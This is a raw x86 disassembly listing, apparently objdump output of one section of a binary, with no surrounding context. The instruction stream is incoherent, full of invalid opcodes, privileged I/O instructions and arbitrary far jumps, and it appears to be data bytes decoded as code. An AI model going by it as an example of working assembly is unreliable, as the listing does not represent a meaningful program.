  41c823:	cmc    
  41c824:	sahf   
  41c825:	into   
  41c826:	mov    ch,0xf7
  41c828:	push   bp
  41c82a:	cs push ss
  41c82c:	into   
  41c82d:	mov    ds:0x7db84a77,al
  41c832:	call   0xfefa3cf8
  41c837:	sbb    eax,0xa30cc8b6
  41c83c:	xchg   ebx,eax
  41c83d:	repz ds iret 
  41c840:	dec    esi
  41c841:	adc    ebp,DWORD PTR [ecx-0x43]
  41c844:	stos   BYTE PTR es:[edi],al
  41c845:	xor    BYTE PTR [ebp+ecx*1+0x67],bl
  41c849:	fbstp  TBYTE PTR [eax+0x47f79e1c]
  41c84f:	pop    ebp
  41c850:	and    eax,0xcf693844
  41c855:	mov    eax,ds
  41c857:	ja     0x41c888
  41c859:	test   al,0x78
  41c85b:	push   esi
  41c85c:	lock (bad) 
  41c85e:	adc    eax,0xebd7a0d8
  41c863:	pop    esi
  41c864:	and    al,0xcd
  41c866:	repnz sub ebp,DWORD PTR [esi+eax*4]
  41c86a:	stos   BYTE PTR es:[edi],al
  41c86b:	pop    eax
  41c86c:	cli    
  41c86d:	dec    esi
  41c86e:	hlt    
  41c86f:	loopne 0x41c83b
  41c871:	adc    bl,ah
  41c873:	mov    BYTE PTR [ecx],bh
  41c875:	(bad)  
  41c877:	sar    BYTE PTR [ebx],cl
  41c879:	inc    eax
  41c87a:	xor    eax,0x2364806e
  41c87f:	imul   edx,DWORD PTR [eax+0x47b0bc32],0xd116d46d
  41c889:	inc    ebp
  41c88a:	xor    BYTE PTR ds:0x20e6283a,bh
  41c890:	push   ss
  41c891:	test   DWORD PTR [esi],ebp
  41c893:	fcomp  QWORD PTR [eax-0x64]
  41c896:	jmp    0x9bc5:0x592c2265
  41c89d:	outs   dx,DWORD PTR ds:[esi]
  41c89e:	xchg   esp,eax
  41c89f:	jns    0x41c8a3
  41c8a1:	enter  0x92a,0xfe
  41c8a5:	popa   
  41c8a6:	pop    ss
  41c8a7:	ficom  WORD PTR ds:0xcab37923
  41c8ad:	cmp    ebx,esp
  41c8af:	mov    bl,0x52
  41c8b1:	xor    BYTE PTR [esi],dh
  41c8b3:	(bad)  
  41c8b4:	sbb    eax,0xce081d42
  41c8b9:	xchg   DWORD PTR [esi],esp
  41c8bb:	pop    esp
  41c8bc:	jmp    0x41c8e3
  41c8be:	mov    al,ds:0xc3ca222
  41c8c3:	xchg   esi,eax
  41c8c4:	push   0x5d5cb80f
  41c8c9:	in     eax,dx
  41c8ca:	ret    
  41c8cb:	jo     0x41c902
  41c8cd:	sbb    cl,0x85
  41c8d0:	or     DWORD PTR [esp+0x7749699],esp
  41c8d7:	push   ecx
  41c8d8:	push   bx
  41c8da:	cdq    
  41c8db:	mov    cl,0xc9
  41c8dd:	pop    ds
  41c8de:	mov    edi,0x2c18fa47
  41c8e3:	nop
  41c8e4:	xor    BYTE PTR [esi+0x2d42374a],ch
  41c8ea:	js     0x41c90b
  41c8ec:	push   edi
  41c8ed:	lods   eax,DWORD PTR ds:[esi]
  41c8ee:	xchg   ebp,eax
  41c8ef:	adc    bl,BYTE PTR [eax+0x3e48ff4c]
  41c8f5:	sbb    ecx,eax
  41c8f7:	fnstenv [ebx-0x437f4cb8]
  41c8fd:	push   ds
  41c8fe:	xor    eax,0xdc3b61c4
  41c903:	pop    edi
  41c904:	inc    esi
  41c905:	jo     0x41c97b
  41c907:	outs   dx,BYTE PTR ds:[esi]
  41c908:	mov    eax,DWORD PTR [edi+0x3f]
  41c90b:	xchg   ebp,eax
  41c90c:	pushf  
  41c90d:	pop    ss
  41c90e:	clc    
  41c90f:	push   esp
  41c910:	mov    al,0x45
  41c912:	push   ebx
  41c913:	mov    edx,0x458d561a
  41c918:	push   es
  41c919:	iret   
  41c91a:	mov    ds:0x2dc80d8f,eax
  41c91f:	sbb    DWORD PTR [ebx-0x36bd2bcb],esp
  41c925:	inc    edi
  41c926:	pop    edx
  41c927:	pop    edi
  41c928:	add    al,0xd9
  41c92a:	adc    eax,ebx
  41c92c:	mov    al,ds:0xfa0cdd2a
  41c931:	ret    
  41c932:	dec    ebp
  41c933:	mov    ch,0xdd
  41c935:	test   ebx,0x413ddc72
  41c93b:	shr    dl,0x62
  41c93e:	cmp    esp,edi
  41c940:	mov    ch,BYTE PTR [edx]
  41c942:	push   ecx
  41c943:	scas   eax,DWORD PTR es:[edi]
  41c944:	adc    DWORD PTR [edx+0x4c075162],edx
  41c94a:	inc    edx
  41c94b:	retf   0x58a2
  41c94e:	enter  0xea22,0x17
  41c952:	fnstcw WORD PTR ds:0x242e9045
  41c958:	aam    0x99
  41c95a:	lds    esi,FWORD PTR [ecx+0x53]
  41c95d:	je     0x41c9ad
  41c95f:	cmp    ecx,0xa9408ec2
  41c965:	fnstsw WORD PTR [edx+0x23]
  41c968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c969:	xor    al,0x7b
  41c96b:	into   
  41c96c:	aaa    
  41c96d:	imul   esp,DWORD PTR [edi+eax*4-0x2b66f522],0xffffffc8
  41c975:	es dec eax
  41c977:	mul    BYTE PTR [ecx+0x59]
  41c97a:	and    DWORD PTR [esi],ebp
  41c97c:	push   ebp
  41c97d:	sahf   
  41c97e:	enter  0xfd5b,0x99
  41c982:	ja     0x41c9e4
  41c984:	cmp    al,0x74
  41c986:	sar    BYTE PTR [ecx+0x1b],0xca
  41c98a:	hlt    
  41c98b:	dec    ebp
  41c98c:	inc    edi
  41c98d:	aam    0x7c
  41c98f:	aas    
  41c990:	add    BYTE PTR [ebp-0x23],dh
  41c993:	push   ebp
  41c994:	inc    ebp
  41c995:	shr    BYTE PTR [ecx+0x0],cl
  41c998:	retf   0x93e3
  41c99b:	mov    gs,WORD PTR [ebp-0x33]
  41c99e:	neg    BYTE PTR ds:0x832b14d4
  41c9a4:	fadd   QWORD PTR [edi+ecx*1+0x4b]
  41c9a8:	addr16 jbe 0x41c9eb
  41c9ab:	bound  edx,QWORD PTR [ecx-0x5d]
  41c9ae:	inc    esp
  41c9af:	js     0x41c99e
  41c9b1:	add    esi,ebp
  41c9b3:	push   ds
  41c9b4:	in     eax,dx
  41c9b5:	sub    BYTE PTR [edx+ebx*4-0x24],dl
  41c9b9:	mov    cl,0x5
  41c9bb:	inc    ebp
  41c9bc:	cmp    BYTE PTR [edx-0x62],0x17
  41c9c0:	sub    DWORD PTR [ebx-0x5b71eb5b],edx
  41c9c6:	mov    edx,DWORD PTR [eax+0x7a3389f]
  41c9cc:	retf   
  41c9cd:	sub    dh,bh
  41c9cf:	sar    BYTE PTR [edx],0xea
  41c9d2:	or     cl,dh
  41c9d4:	enter  0xe6fd,0xe7
  41c9d8:	sub    al,0x9
  41c9da:	jae    0x41c99d
  41c9dc:	out    dx,eax
  41c9dd:	pusha  
  41c9de:	das    
  41c9df:	stc    
  41c9e0:	sbb    esi,DWORD PTR [esi]
  41c9e2:	jl     0x41ca5d
  41c9e4:	idiv   eax
  41c9e6:	mov    ah,0xed
  41c9e8:	inc    ebp
  41c9e9:	push   esi
  41c9ea:	popf   
  41c9eb:	das    
  41c9ec:	lahf   
  41c9ed:	jg     0x41c988
  41c9ef:	lock in eax,0x25
  41c9f2:	pop    ss
  41c9f3:	in     al,0x1c
  41c9f5:	popf   
  41c9f6:	xchg   edi,eax
  41c9f7:	stc    
  41c9f8:	sub    eax,0x78bc53c8
  41c9fd:	std    
  41c9fe:	dec    esp
  41c9ff:	lea    eax,ds:0xe41039bf
  41ca05:	outs   dx,DWORD PTR ds:[esi]
  41ca06:	cdq    
  41ca07:	mov    ebp,0x5eb8e185
  41ca0c:	outs   dx,DWORD PTR ds:[esi]
  41ca0d:	dec    ebx
  41ca0e:	pop    es
  41ca0f:	pop    ebx
  41ca10:	in     al,0x75
  41ca12:	inc    ebp
  41ca13:	mov    BYTE PTR [edi+0x75fcba89],ah
  41ca19:	xor    DWORD PTR [edi],ebp
  41ca1b:	bound  edx,QWORD PTR [esi-0x243cad43]
  41ca21:	stos   BYTE PTR es:[edi],al
  41ca22:	loop   0x41ca49
  41ca24:	jle    0x41c9aa
  41ca26:	pop    ds
  41ca27:	loop   0x41ca00
  41ca29:	mov    esi,0x9a278986
  41ca2e:	fwait
  41ca2f:	inc    esi
  41ca30:	fnstenv [esi+eax*8]
  41ca33:	fsubrp st(1),st
  41ca35:	sbb    ah,BYTE PTR [edi+0x76f83c81]
  41ca3b:	inc    eax
  41ca3c:	mov    esi,0xe0aeae7f
  41ca41:	cs fs aaa 
  41ca44:	or     eax,DWORD PTR [edx]
  41ca46:	dec    dl
  41ca48:	dec    edi
  41ca49:	add    BYTE PTR [ebx],0xa3
  41ca4c:	mov    al,ah
  41ca4e:	adc    al,BYTE PTR [ebp+0x42]
  41ca51:	xchg   ebx,eax
  41ca52:	pusha  
  41ca53:	xlat   BYTE PTR ds:[ebx]
  41ca54:	inc    ecx
  41ca55:	inc    eax
  41ca56:	or     BYTE PTR [edi],0x23
  41ca59:	loopne 0x41c9f0
  41ca5b:	lea    ebp,[ebx]
  41ca5d:	in     eax,0x2a
  41ca5f:	retf   0xf28e
  41ca62:	sbb    cl,BYTE PTR [edi+0x27b3185d]
  41ca68:	dec    esi
  41ca69:	sbb    al,0x7
  41ca6b:	push   esp
  41ca6c:	lock fdivr st,st(2)
  41ca6f:	rcr    DWORD PTR [eax+0x11],0xda
  41ca73:	or     ecx,DWORD PTR [edx-0x1b74b369]
  41ca79:	mov    WORD PTR [edi+edx*2],ss
  41ca7c:	mov    al,BYTE PTR [ecx]
  41ca7e:	inc    edi
  41ca7f:	mov    eax,DWORD PTR [edi-0x6d9af033]
  41ca85:	sti    
  41ca86:	xor    ebx,DWORD PTR [edx+0x24]
  41ca89:	rcr    DWORD PTR [edi+0x35],1
  41ca8c:	jg     0x41ca94
  41ca8e:	jg     0x41cad8
  41ca90:	call   FWORD PTR [esi]
  41ca92:	xchg   esi,eax
  41ca93:	ss stc 
  41ca95:	lods   al,BYTE PTR ds:[esi]
  41ca96:	stc    
  41ca97:	push   esi
  41ca98:	xchg   ecx,eax
  41ca99:	cmovg  esp,edi
  41ca9c:	jo     0x41caae
  41ca9e:	xchg   ebp,eax
  41ca9f:	les    esp,FWORD PTR [ecx+0x1c]
  41caa2:	sbb    BYTE PTR [ebx-0x6f680a2e],dh
  41caa8:	js     0x41ca9e
  41caaa:	out    0x1a,eax
  41caac:	mov    dh,BYTE PTR [ebp-0x38570ec4]
  41cab2:	push   0x5bb58270
  41cab7:	push   ds
  41cab8:	fs std 
  41caba:	and    edi,DWORD PTR [ebp+0x79b9edba]
  41cac0:	loopne 0x41caaa
  41cac2:	dec    ebx
  41cac3:	ins    DWORD PTR es:[edi],dx
  41cac4:	cmc    
  41cac5:	xchg   ebp,eax
  41cac6:	pop    ecx
  41cac7:	loop   0x41ca67
  41cac9:	sti    
  41caca:	and    eax,0xeab105ab
  41cacf:	outs   dx,BYTE PTR ds:[esi]
  41cad0:	retf   
  41cad1:	add    eax,0xcbc658dc
  41cad6:	fsub   QWORD PTR [edi]
  41cad8:	dec    edi
  41cad9:	jne    0x41cb39
  41cadb:	jae    0x41ca8c
  41cadd:	xor    edi,ebx
  41cadf:	mov    dh,dh
  41cae1:	sub    al,0x86
  41cae3:	stc    
  41cae4:	xchg   esp,eax
  41cae5:	pop    esi
  41cae6:	cwde   
  41cae7:	call   0xb43e:0xfcd5765f
  41caee:	xlat   BYTE PTR ds:[ebx]
  41caef:	jnp    0x41cad4
  41caf1:	pop    edi
  41caf2:	jecxz  0x41caf4
  41caf4:	fnsave [esi]
  41caf6:	(bad)  
  41caf8:	cdq    
  41caf9:	jnp    0x41cb0d
  41cafb:	xor    eax,0xee6baaee
  41cb00:	rcr    BYTE PTR [ebp+0x62],1
  41cb03:	mov    ds:0x5729ca94,al
  41cb08:	stos   BYTE PTR es:[edi],al
  41cb09:	xor    DWORD PTR [esi+ebp*2+0x7d],esi
  41cb0d:	outs   dx,DWORD PTR ds:[esi]
  41cb0e:	jne    0x41cb87
  41cb10:	call   0x586b:0x32ec24d7
  41cb17:	adc    al,0xcb
  41cb19:	pop    edi
  41cb1a:	or     DWORD PTR [esi+0x3d],ebx
  41cb1d:	sbb    dl,BYTE PTR [eax+0x6ef6e379]
  41cb23:	gs dec ebx
  41cb25:	ja     0x41cb75
  41cb27:	mov    edi,0xb8787c98
  41cb2c:	cmp    DWORD PTR [edi],edi
  41cb2e:	mov    dh,cl
  41cb30:	or     BYTE PTR [eax-0x17],ah
  41cb33:	jne    0x41cacc
  41cb35:	jbe    0x41cb9e
  41cb37:	adc    ecx,DWORD PTR [edx+eiz*2+0x6ea018e5]
  41cb3e:	pop    eax
  41cb3f:	jp     0x41caee
  41cb41:	dec    edi
  41cb42:	xlat   BYTE PTR ds:[ebx]
  41cb43:	sbb    al,BYTE PTR ds:0x37726a6b
  41cb49:	jge    0x41cad3
  41cb4b:	or     al,0x32
  41cb4d:	inc    eax
  41cb4e:	shl    BYTE PTR [eax],1
  41cb50:	lea    edx,[ebx+esi*8]
  41cb53:	push   cs
  41cb54:	mov    al,0xa6
  41cb56:	mov    ecx,edi
  41cb58:	daa    
  41cb59:	mov    fs,WORD PTR [edx+0x21]
  41cb5c:	xchg   bh,bh
  41cb5e:	vpmaxsw ymm0,ymm5,YMMWORD PTR [ebp+0x2c682cc1]
  41cb66:	aas    
  41cb67:	sub    DWORD PTR [eax+esi*2-0x2a],eax
  41cb6b:	jmp    0x7e4dfbca
  41cb70:	inc    esp
  41cb71:	sahf   
  41cb72:	sub    ebp,edx
  41cb74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb75:	cs push bx
  41cb78:	jno    0x41cb18
  41cb7a:	fstp   QWORD PTR ds:0x4fb96d02
  41cb80:	in     al,dx
  41cb81:	pop    edx
  41cb82:	adc    edx,DWORD PTR [esi]
  41cb84:	retf   0x8c74
  41cb87:	ret    
  41cb88:	cmp    DWORD PTR [ebx],0x23
  41cb8b:	hlt    
  41cb8c:	jbe    0x41cb62
  41cb8e:	or     DWORD PTR ds:[eax+0x7e455c46],ebx
  41cb95:	lea    edi,[ecx+0x5c25b461]
  41cb9b:	push   cs
  41cb9c:	or     esp,ebp
  41cb9e:	sub    al,0x5e
  41cba0:	and    edi,ebp
  41cba2:	pop    eax
  41cba3:	inc    eax
  41cba4:	sbb    ebx,DWORD PTR [eax]
  41cba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cba7:	adc    DWORD PTR [edx],ebp
  41cba9:	bound  esp,QWORD PTR [eax-0x13b510b7]
  41cbaf:	xor    eax,0xd4745a18
  41cbb4:	dec    esp
  41cbb5:	jge    0x41cc01
  41cbb7:	and    eax,0x1b9d87b6
  41cbbc:	inc    ecx
  41cbbd:	mov    fs,WORD PTR [ebx-0x724d2a2b]
  41cbc3:	push   ecx
  41cbc4:	adc    DWORD PTR [edx],ebp
  41cbc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbc7:	pop    edx
  41cbc8:	in     eax,0x43
  41cbca:	xor    DWORD PTR [eax-0x5d26861d],edx
  41cbd0:	jo     0x41cba8
  41cbd2:	mov    WORD PTR [ecx],es
  41cbd4:	push   0x3c
  41cbd6:	in     al,dx
  41cbd7:	icebp  
  41cbd8:	adc    al,0xa
  41cbda:	(bad)  
  41cbdb:	or     edi,DWORD PTR [esi]
  41cbdd:	dec    eax
  41cbde:	sbb    DWORD PTR ds:0xc2d4b5cf,ebp
  41cbe4:	jbe    0x41cc37
  41cbe6:	and    BYTE PTR [edi+0x2],ch
  41cbe9:	jmp    0x91d4:0x6695de26
  41cbf0:	push   ds
  41cbf1:	repz into 
  41cbf3:	pop    ecx
  41cbf4:	js     0x41cb8f
  41cbf6:	in     eax,0x84
  41cbf8:	in     eax,dx
  41cbf9:	(bad)  
  41cbfa:	jmp    0xfb0ee53b
  41cbff:	pop    esp
  41cc00:	popf   
  41cc01:	mov    bh,0x86
  41cc03:	cmp    cl,BYTE PTR [ebx+eiz*1-0x78]
  41cc07:	shr    BYTE PTR [esi+0x5b],cl
  41cc0a:	(bad)  
  41cc0b:	daa    
  41cc0c:	(bad)  
  41cc0d:	(bad)  
  41cc0e:	lock aam 0x58
  41cc11:	or     BYTE PTR [edi-0x30],bh
  41cc14:	or     cl,0x65
  41cc17:	fwait
  41cc18:	mov    al,ds:0x936134a3
  41cc1d:	repz mov ecx,0xaa007212
  41cc23:	mov    ebp,0x9ba71602
  41cc28:	shr    dh,1
  41cc2a:	in     al,dx
  41cc2b:	ds sar bx,1
  41cc2f:	mov    bh,0x8d
  41cc31:	or     DWORD PTR [ecx],0x44682801
  41cc37:	call   0x5a9db4e
  41cc3c:	cmc    
  41cc3d:	pop    edi
  41cc3e:	outs   dx,BYTE PTR ds:[esi]
  41cc3f:	ins    DWORD PTR es:[edi],dx
  41cc40:	fucomi st,st(0)
  41cc42:	mov    gs,WORD PTR [eax]
  41cc44:	push   0x19
  41cc46:	loopne 0x41cc92
  41cc48:	add    dl,dl
  41cc4a:	push   ss
  41cc4b:	or     dl,bl
  41cc4d:	rcl    BYTE PTR [ecx],cl
  41cc4f:	test   cl,dl
  41cc51:	xchg   ebx,esi
  41cc53:	retf   0xbc65
  41cc56:	pop    esp
  41cc57:	or     eax,0x38d2c28e
  41cc5c:	and    al,0x8c
  41cc5e:	jbe    0x41cc96
  41cc60:	daa    
  41cc61:	cmp    al,0x8f
  41cc63:	push   eax
  41cc64:	enter  0xe946,0xc2
  41cc68:	push   ebp
  41cc69:	add    DWORD PTR [edx+0x2b],edi
  41cc6c:	jne    0x41cc14
  41cc6e:	dec    ecx
  41cc6f:	ja     0x41cc9c
  41cc71:	xor    eax,0x181aab81
  41cc76:	xchg   ebx,eax
  41cc77:	enter  0x14d8,0xda
  41cc7b:	dec    ecx
  41cc7c:	test   al,0xb
  41cc7e:	test   BYTE PTR ds:0xe2d8adcb,0xad
  41cc85:	mov    cl,0xf2
  41cc87:	adc    eax,0x55dc38d2
  41cc8c:	adc    DWORD PTR [edi+0x61],0x7e63830d
  41cc93:	push   edi
  41cc94:	ja     0x41cc6a
  41cc96:	add    esp,DWORD PTR [ebx+eax*2-0x10613aa0]
  41cc9d:	xor    al,0x7c
  41cc9f:	push   eax
  41cca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cca1:	lods   al,BYTE PTR ds:[esi]
  41cca2:	xor    al,0xaa
  41cca4:	or     eax,ebx
  41cca6:	and    ebp,DWORD PTR [ecx+0x5828578b]
  41ccac:	adc    DWORD PTR [ebp+0x2f5e6523],edi
  41ccb2:	push   0x9aaf7ea1
  41ccb7:	push   edi
  41ccb8:	dec    edi
  41ccb9:	jle    0x41ccb1
  41ccbb:	fwait
  41ccbc:	in     al,dx
  41ccbd:	mov    BYTE PTR [edx+esi*2+0x222ab72e],dl
  41ccc4:	inc    ecx
  41ccc5:	stos   DWORD PTR es:[edi],eax
  41ccc6:	or     DWORD PTR [ecx+0x4b8e4b7e],0x4cb0cb19
  41ccd0:	add    ah,BYTE PTR [ebx-0x20827060]
  41ccd6:	dec    edi
  41ccd7:	sub    al,0xb
  41ccd9:	xchg   esp,eax
  41ccda:	test   DWORD PTR [ecx+0x4e],eax
  41ccdd:	jmp    0x41cce4
  41ccdf:	jno    0x41ccbb
  41cce1:	xor    DWORD PTR [ebp-0x8],ecx
  41cce4:	xlat   BYTE PTR ds:[ebx]
  41cce5:	push   ecx
  41cce6:	inc    ebp
  41cce7:	idiv   BYTE PTR [ebp+ebx*1+0x46]
  41cceb:	and    al,0xc2
  41cced:	mov    al,0x20
  41ccef:	cmp    BYTE PTR [ecx-0x4],0x27
  41ccf3:	jnp    0x41cd23
  41ccf5:	scas   al,BYTE PTR es:[edi]
  41ccf6:	xor    DWORD PTR [ebx],0x3711cd44
  41ccfc:	push   ds
  41ccfd:	nop
  41ccfe:	enter  0xd80a,0xb0
  41cd02:	dec    esi
  41cd03:	int3   
  41cd04:	retf   
  41cd05:	xlat   BYTE PTR ds:[ebx]
  41cd06:	xor    bh,BYTE PTR [edi+0x19a18862]
  41cd0c:	push   cs
  41cd0d:	mov    ecx,edx
  41cd0f:	adc    eax,0x5285fbae
  41cd14:	mov    bh,0x26
  41cd16:	test   DWORD PTR [ecx-0x7675b0b6],edi
  41cd1c:	push   es
  41cd1d:	(bad)  
  41cd1e:	push   ebx
  41cd1f:	jecxz  0x41cd53
  41cd21:	hlt    
  41cd22:	pop    ebp
  41cd23:	in     eax,0xd9
  41cd25:	rol    esi,0xa6
  41cd28:	nop
  41cd29:	jp     0x41cd54
  41cd2b:	arpl   WORD PTR [edx+0x7fc8a81f],cx
  41cd31:	daa    
  41cd32:	inc    ebp
  41cd33:	cdq    
  41cd34:	sar    BYTE PTR ds:0x21eaf57b,cl
  41cd3a:	push   ss
  41cd3b:	call   0xfbd9:0x94f1fe22
  41cd42:	cmp    ah,dl
  41cd44:	push   ebx
  41cd45:	xor    BYTE PTR [esi-0x6d],al
  41cd48:	or     esi,DWORD PTR [ecx+0x6]
  41cd4b:	or     esp,DWORD PTR [eax]
  41cd4d:	and    al,0xa4
  41cd4f:	pusha  
  41cd50:	cdq    
  41cd51:	or     dl,bh
  41cd53:	popa   
  41cd54:	in     eax,0xc9
  41cd56:	into   
  41cd57:	dec    DWORD PTR [eax]
  41cd59:	dec    edi
  41cd5a:	mov    dh,BYTE PTR [edx-0x4463fe84]
  41cd60:	popf   
  41cd61:	sbb    dl,BYTE PTR [edi-0x2d]
  41cd64:	in     al,dx
  41cd65:	enter  0x7999,0xe6
  41cd69:	inc    ebp
  41cd6a:	mov    edx,0xfff74813
  41cd6f:	adc    BYTE PTR [ebx+ebp*1-0x7bd8fe88],0xf9
  41cd77:	mov    ds:0x7cb4ffa2,al
  41cd7c:	or     edi,DWORD PTR [esi+0x4d]
  41cd7f:	pop    es
  41cd80:	inc    ecx
  41cd81:	test   al,0x5b
  41cd83:	cmc    
  41cd84:	jp     0x41cd60
  41cd86:	dec    edi
  41cd87:	aad    0xa4
  41cd89:	cli    
  41cd8a:	pop    edi
  41cd8b:	les    ecx,FWORD PTR [ecx]
  41cd8d:	jmp    0x314c108b
  41cd92:	sbb    cl,ah
  41cd94:	mov    bh,0xd3
  41cd96:	mov    DWORD PTR [edx+edi*8],esi
  41cd99:	add    al,0xd6
  41cd9b:	popa   
  41cd9c:	mov    ebp,0x954124e8
  41cda1:	jo     0x41cd3f
  41cda3:	dec    esi
  41cda4:	pushf  
  41cda5:	dec    edx
  41cda6:	mov    ah,0x16
  41cda8:	xchg   ecx,eax
  41cda9:	bound  ebp,QWORD PTR [ecx+0x59]
  41cdac:	xchg   edi,eax
  41cdad:	inc    ebx
  41cdae:	pop    esi
  41cdaf:	(bad)  
  41cdb0:	mov    ecx,0xadabebc1
  41cdb5:	les    ebx,FWORD PTR [edi+0x5eef3f9e]
  41cdbb:	inc    esi
  41cdbc:	out    0x45,eax
  41cdbe:	add    al,0x35
  41cdc0:	sahf   
  41cdc1:	push   ecx
  41cdc2:	shr    BYTE PTR [eax+ecx*4+0x5b],1
  41cdc6:	jmp    0x232f:0x693dc06d
  41cdcd:	inc    edx
  41cdce:	test   al,0x7e
  41cdd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdd1:	jmp    0x8168:0x4fdd8ae9
  41cdd8:	shl    bh,1
  41cdda:	mov    eax,ds:0xfd5c2937
  41cde0:	mov    dl,0xd7
  41cde2:	jge    0x41cdc6
  41cde4:	mov    dl,0xcd
  41cde6:	sub    DWORD PTR [ecx+0x7dfe2722],eax
  41cdec:	jp     0x41cdf6
  41cdee:	jp     0x41ce58
  41cdf0:	xchg   edi,eax
  41cdf1:	mov    dh,0x23
  41cdf3:	inc    ecx
  41cdf4:	pop    edi
  41cdf5:	xor    eax,0xb303e6e7
  41cdfa:	or     BYTE PTR [esi],0xd0
  41cdfd:	cmp    eax,0x80377b41
  41ce02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce03:	sbb    BYTE PTR [ebx],bl
  41ce05:	push   cs
  41ce06:	ins    BYTE PTR es:[edi],dx
  41ce07:	mov    edi,0x55a8cea7
  41ce0c:	leave  
  41ce0d:	scas   eax,DWORD PTR es:[edi]
  41ce0e:	cmp    eax,0x446f37fe
  41ce13:	adc    ebp,DWORD PTR [esi]
  41ce15:	adc    DWORD PTR [ecx+0x44],edx
  41ce18:	sbb    BYTE PTR [esi],dh
  41ce1a:	jle    0x41cdec
  41ce1c:	dec    esp
  41ce1d:	in     al,0xec
  41ce1f:	in     eax,dx
  41ce20:	pop    ebp
  41ce21:	jne    0x41ce7e
  41ce23:	and    dl,BYTE PTR [edx-0x1f5345ae]
  41ce29:	js     0x41cea9
  41ce2b:	jbe    0x41cea4
  41ce2d:	test   BYTE PTR [esp+edx*8+0x9fcffda],bl
  41ce34:	jg     0x41ce98
  41ce36:	mov    esp,0xe5400efe
  41ce3b:	push   ss
  41ce3c:	xchg   ebx,eax
  41ce3d:	or     DWORD PTR [eax+0xc760a47],0x3119c218
  41ce47:	push   0xd4e7d116
  41ce4c:	stc    
  41ce4d:	mov    esi,0x64b74959
  41ce52:	lds    eax,FWORD PTR [esi]
  41ce54:	(bad)  
  41ce55:	inc    eax
  41ce56:	ficom  WORD PTR ds:0x743ff840
  41ce5c:	jmp    0xe4a0a7ab
  41ce61:	ds jne 0x41ce70
  41ce64:	xor    esp,esp
  41ce66:	inc    edi
  41ce67:	rcl    bh,cl
  41ce69:	cmc    
  41ce6a:	jle    0x41ce34
  41ce6c:	pop    esi
  41ce6d:	scas   eax,DWORD PTR es:[edi]
  41ce6e:	sahf   
  41ce6f:	shr    BYTE PTR [edi-0x5059f32f],0x7f
  41ce76:	ret    
  41ce77:	test   esp,ecx
  41ce79:	xor    edi,DWORD PTR [edx-0x37]
  41ce7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce7d:	je     0x41ce55
  41ce7f:	mov    ds:0xb213841c,eax
  41ce84:	pop    es
  41ce85:	nop
  41ce86:	lahf   
  41ce87:	rcl    DWORD PTR [ecx],0xf2
  41ce8a:	jl     0x41cecd
  41ce8c:	adc    al,BYTE PTR [ebx-0x284cf207]
  41ce92:	push   esp
  41ce93:	jns    0x41ceab
  41ce95:	lea    ecx,[ebp+0x3ebb5d94]
  41ce9b:	into   
  41ce9c:	push   esi
  41ce9d:	mov    ebx,0x3ad5fd9c
  41cea2:	popa   
  41cea3:	(bad)  
  41cea4:	inc    ebx
  41cea5:	pop    ds
  41cea6:	jle    0x41ce47
  41cea8:	sbb    edi,DWORD PTR [ebx-0x5e8d4f3a]
  41ceae:	(bad)  
  41ceaf:	adc    DWORD PTR [ecx],edx
  41ceb1:	or     DWORD PTR [ebx],ebx
  41ceb3:	out    dx,al
  41ceb4:	push   es
  41ceb5:	xchg   edx,eax
  41ceb6:	jns    0x41ce48
  41ceb8:	push   esi
  41ceb9:	inc    esi
  41ceba:	mov    WORD PTR ds:0xd1ef9f70,gs
  41cec0:	sub    al,0x1e
  41cec2:	mov    bh,0xd7
  41cec4:	stos   DWORD PTR es:[edi],eax
  41cec5:	and    BYTE PTR fs:[ecx-0x62],al
  41cec9:	dec    esp
  41ceca:	jne    0x41cec3
  41cecc:	(bad)  
  41cecd:	push   ss
  41cece:	sbb    eax,0x55ac8b2a
  41ced3:	or     BYTE PTR [edx],al
  41ced5:	retf   0x1ad3
  41ced8:	(bad)  
  41ceda:	cdq    
  41cedb:	mov    ecx,0x9560ed54
  41cee0:	fcom   QWORD PTR ds:0xa77ee8a7
  41cee6:	sbb    bh,ah
  41cee8:	jp     0x41ceff
  41ceea:	xor    eax,0xf8bad78d
  41ceef:	fwait
  41cef0:	sbb    eax,0xe2f15ff
  41cef5:	xchg   bl,ah
  41cef7:	pop    ds
  41cef8:	jge    0x41cecf
  41cefa:	jo     0x41cf28
  41cefc:	cmp    BYTE PTR ds:[edx+edi*1-0x39],0x8d
  41cf02:	mov    edi,DWORD PTR [edi+0x17]
  41cf05:	pusha  
  41cf06:	add    al,0xac
  41cf08:	fwait
  41cf09:	cld    
  41cf0a:	jne    0x41cef5
  41cf0c:	jp     0x41cf7a
  41cf0e:	mov    cl,0x37
  41cf10:	cld    
  41cf11:	mov    esi,0x2b6f552
  41cf16:	jg     0x41cf4b
  41cf18:	mov    al,0x16
  41cf1a:	pop    es
  41cf1b:	les    ebp,FWORD PTR [ecx]
  41cf1d:	sub    DWORD PTR [esi+ecx*2-0x64b3ec1],eax
  41cf24:	push   ss
  41cf25:	adc    al,0xee
  41cf27:	cld    
  41cf28:	adc    BYTE PTR [edx+ebp*1],cl
  41cf2b:	test   DWORD PTR [ebp+0x5d8bc49d],ebp
  41cf31:	repz in eax,dx
  41cf33:	std    
  41cf34:	add    al,0x2
  41cf36:	mov    ecx,0x4e73b672
  41cf3b:	iret   
  41cf3c:	call   0xe87:0x8bf2d620
  41cf43:	sub    edx,edx
  41cf45:	mov    esi,0x6c0f398
  41cf4a:	pop    edx
  41cf4b:	lds    esp,FWORD PTR [eax+0x11]
  41cf4e:	mov    bl,0x8b
  41cf50:	test   al,0x7
  41cf52:	sbb    eax,0x544348e1
  41cf57:	add    BYTE PTR [ecx],ch
  41cf59:	iret   
  41cf5a:	pop    ss
  41cf5b:	fcmovnu st,st(4)
  41cf5d:	pop    esi
  41cf5e:	sti    
  41cf5f:	mov    edx,0x2c57e5cb
  41cf64:	stos   DWORD PTR es:[edi],eax
  41cf65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf66:	loop   0x41cfd4
  41cf68:	rcl    bh,0x52
  41cf6b:	dec    eax
  41cf6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
